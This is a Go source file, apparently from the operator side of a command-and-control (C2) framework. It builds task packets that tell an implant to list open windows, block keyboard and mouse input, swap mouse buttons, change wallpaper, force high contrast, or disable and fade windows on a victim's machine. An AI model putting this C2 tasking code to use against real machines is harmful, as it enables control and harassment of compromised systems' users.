//go:build !implant

package task

import (
	"io"
	"os"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device"
)

// WindowList returns a list active Windows Packet. This will instruct the
// client to return a list of the current open Windows with detailed information.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvWindowList
//
//  Input:
//      <none>
//  Output:
//      uint32     // Count
//      []Window { // List of open Windows
//          uint64 // Handle
//          string // Title
//          uint32 // Position X
//          uint32 // Position Y
//          uint32 // Width
//          uint32 // Height
//      }
func WindowList() *com.Packet {
	return &com.Packet{ID: TvWindowList}
}

// SwapMouse returns a swap mouse buttons Packet. This will instruct the client
// swap the mouse buttons. The buttons will stay swapped until a successful call
// to 'SwapMouse' with false.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvTroll
//
//  Input:
//      uint8  // Can be 0 or 1 depending on the state set.
//  Output:
//      <none>
func SwapMouse(e bool) *com.Packet {
	n := &com.Packet{ID: TvTroll}
	if e {
		n.WriteUint8(taskTrollSwapEnable)
	} else {
		n.WriteUint8(taskTrollSwapDisable)
	}
	return n
}

// BlockInput returns a block user input Packet. This will instruct the client
// to block all user supplied input (keyboard and mouse). Input will be blocked
// until a successful call to 'BlockInput' with false.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvTroll
//
//  Input:
//      uint8  // Can be 6 or 7 depending on the state set.
//  Output:
//      <none>
func BlockInput(e bool) *com.Packet {
	n := &com.Packet{ID: TvTroll}
	if e {
		n.WriteUint8(taskTrollBlockInputEnable)
	} else {
		n.WriteUint8(taskTrollBlockInputDisable)
	}
	return n
}

// Wallpaper returns a change user wallpaper Packet. This will instruct the client
// to change the current users's wallpaper to the filepath provided.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvTroll
//
//  Input:
//      uint8  // Always set to 5 for this task.
//      string // Destination
//  Output:
//      <none>
func Wallpaper(s string) *com.Packet {
	n := &com.Packet{ID: TvTroll}
	n.WriteUint8(taskTrollWallpaperPath)
	n.WriteString(s)
	return n
}

// HighContrast returns a set HighContrast theme Packet. This will instruct the
// client to set the theme to HighContrast. The theme will be set until a successful
// call to 'HighContrast' with false.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvTroll
//
//  Input:
//      uint8  // Can be 2 or 3 depending on the state set.
//  Output:
//      <none>
func HighContrast(e bool) *com.Packet {
	n := &com.Packet{ID: TvTroll}
	if e {
		n.WriteUint8(taskTrollHcEnable)
	} else {
		n.WriteUint8(taskTrollHcDisable)
	}
	return n
}

// WallpaperBytes returns a change user wallpaper Packet. This will instruct the
// client to change the current users's wallpaper to the data contained in the
// supplied byte slice. The new file will be written in a temporary location
// before being used as a wallpaper.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvTroll
//
//  Input:
//      uint8  // Always set to 4 for this task.
//      []byte // File Data
//  Output:
//      <none>
func WallpaperBytes(b []byte) *com.Packet {
	n := &com.Packet{ID: TvTroll}
	n.WriteUint8(taskTrollWallpaper)
	n.Write(b)
	return n
}

// WindowEnable returns a enable/disable window Packet. This will instruct the
// client to block all user supplied input (keyboard and mouse) to the specified
// window handle. Input will be blocked and the window will not be usable until
// a successful call to 'WindowEnable' with the handle and false.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvUI
//
//  Input:
//      uint8  // Can be 0 or 1 depending on the state set.
//      uint64 // Handle
//  Output:
//      <none>
func WindowEnable(h uint64, e bool) *com.Packet {
	n := &com.Packet{ID: TvUI}
	if e {
		n.WriteUint8(taskWindowEnable)
	} else {
		n.WriteUint8(taskWindowDisable)
	}
	n.WriteUint64(h)
	return n
}

// WallpaperFile returns a change user wallpaper Packet. This will instruct the
// client to change the current users's wallpaper to the supplied (server local)
// file. The new file will be written in a temporary location before being used
// as a wallpaper.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvTroll
//
//  Input:
//      uint8  // Always set to 4 for this task.
//      []byte // File Data
//  Output:
//      <none>
func WallpaperFile(s string) (*com.Packet, error) {
	// 0 - READONLY
	f, err := os.OpenFile(device.Expand(s), 0, 0)
	if err != nil {
		return nil, err
	}
	n, err := WallpaperReader(f)
	f.Close()
	return n, err
}

// WindowTransparency returns a set window transparency Packet. This will instruct
// the client to set the window with the supplied handle with the specified
// transparency value. This value ranges from 0 (transparent) to 255 (opaque).
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvUI
//
//  Input:
//      uint8  // Always 2 for this task.
//      uint64 // Handle
//  Output:
//      <none>
func WindowTransparency(h uint64, v byte) *com.Packet {
	n := &com.Packet{ID: TvUI}
	n.WriteUint8(taskWindowTransparency)
	n.WriteUint64(h)
	n.WriteUint8(v)
	return n
}

// WallpaperReader returns a change user wallpaper Packet. This will instruct the
// client to change the current users's wallpaper to the data contained in the
// supplied reader. The new file will be written in a temporary location before
// being used as a wallpaper.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvTroll
//
//  Input:
//      uint8  // Always set to 4 for this task.
//      []byte // File Data
//  Output:
//      <none>
func WallpaperReader(r io.Reader) (*com.Packet, error) {
	n := &com.Packet{ID: TvTroll}
	n.WriteUint8(taskTrollWallpaper)
	_, err := io.Copy(n, r)
	return n, err
}
